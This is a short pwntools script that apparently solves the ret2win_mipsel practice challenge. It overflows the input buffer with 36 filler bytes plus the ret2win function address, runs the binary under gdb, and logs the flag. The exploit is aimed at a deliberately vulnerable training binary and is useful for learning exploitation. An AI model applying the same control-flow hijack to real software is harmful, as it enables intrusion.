import pwn
import logging


logging.basicConfig(
    level=logging.DEBUG,
    format= '[%(asctime)s] {%(pathname)s:%(lineno)d} %(levelname)s - %(message)s',
    datefmt='%H:%M:%S'
)
logger = logging.getLogger(__name__)

DEBUG = True
BINARY = './ret2win_mipsel'
GOAL_FUNCTION = 'ret2win'
GOAL_ADDRESS = 0

GDB_SCRIPT = f'''
set pagination off

b *0x4009c4
commands
printf "read complete, check the stack:"
x/20wx $sp
c
end

b *0x400a00
commands 
printf "woot, reached goal address"
bt
c
end

c
'''


def set_properties(elf):
    global GOAL_ADDRESS
    GOAL_ADDRESS = elf.symbols[GOAL_FUNCTION]

    pwn.context.bits = elf.bits
    pwn.context.endian = elf.endian
    pwn.context.arch = elf.arch
    pwn.context.log_level = 'debug'


def create_shellcode():
    shellcode = b''
    shellcode += 36 * b'A'
    shellcode += pwn.p32(GOAL_ADDRESS)

    logging.info(f'Created shellcode:\n{shellcode}')

    return shellcode


def exploit(elf, shellcode):
    p = pwn.gdb.debug(elf.path, GDB_SCRIPT)

    p.sendline(shellcode)
    p.recvuntil('Thank you!')

    data = p.recvall()
    logger.info(f'FLAG:{data}')

    p.interactive()


def main():
    elf = pwn.ELF(BINARY)
    set_properties(elf)

    shellcode = create_shellcode()

    exploit(elf, shellcode)


if __name__ == '__main__':
    main()
